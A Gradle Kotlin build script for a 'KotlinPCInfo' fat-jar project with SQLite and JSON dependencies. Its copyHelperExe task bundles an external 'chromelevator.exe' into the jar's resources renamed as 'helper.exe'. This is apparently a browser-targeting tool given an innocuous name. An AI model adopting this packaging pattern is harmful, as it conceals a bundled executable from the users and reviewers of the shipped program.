import org.jetbrains.kotlin.gradle.tasks.KotlinCompile
import com.github.jengelman.gradle.plugins.shadow.tasks.ShadowJar
import java.io.File

plugins {
    kotlin("jvm") version "1.9.20"
    kotlin("plugin.serialization") version "1.9.20"
    id("com.github.johnrengelman.shadow") version "8.1.1"
    application
}

group = "com.kotlinpc"
version = "1.0-SNAPSHOT"

java {
    toolchain {
        languageVersion.set(JavaLanguageVersion.of(17))
    }
    sourceCompatibility = JavaVersion.VERSION_17
    targetCompatibility = JavaVersion.VERSION_17
}

repositories {
    mavenCentral()
}

dependencies {
    // Kotlin standard library
    implementation(kotlin("stdlib"))
    
    // Kotlinx Serialization
    implementation("org.jetbrains.kotlinx:kotlinx-serialization-json:1.6.0")
    
    // SQLite JDBC driver
    implementation("org.xerial:sqlite-jdbc:3.43.2.2")
    
    // JSON library (org.json)
    implementation("org.json:json:20230618")
}

application {
    mainClass.set("MainKt")
}

tasks.withType<KotlinCompile> {
    kotlinOptions {
        jvmTarget = "17"
        freeCompilerArgs = listOf("-opt-in=kotlin.RequiresOptIn")
    }
}

tasks.named<ShadowJar>("shadowJar") {
    archiveBaseName.set("KotlinPCInfo")
    archiveVersion.set("1.0-SNAPSHOT")
    archiveClassifier.set("all")
    manifest {
        attributes(mapOf("Main-Class" to "MainKt"))
    }
    mergeServiceFiles()
}

// Task to copy chromelevator.exe to resources as helper.exe
tasks.register<Copy>("copyHelperExe") {
    val resourcesDir = File("src/main/resources")
    resourcesDir.mkdirs()
    
    from("chromelevator.exe")
    into(resourcesDir)
    rename("chromelevator.exe", "helper.exe")
    
    // Only run if chromelevator.exe exists
    onlyIf { File("chromelevator.exe").exists() }
}

// Ensure resources are processed before compilation
tasks.named("processResources") {
    dependsOn("copyHelperExe")
}

tasks.build {
    dependsOn("shadowJar")
}

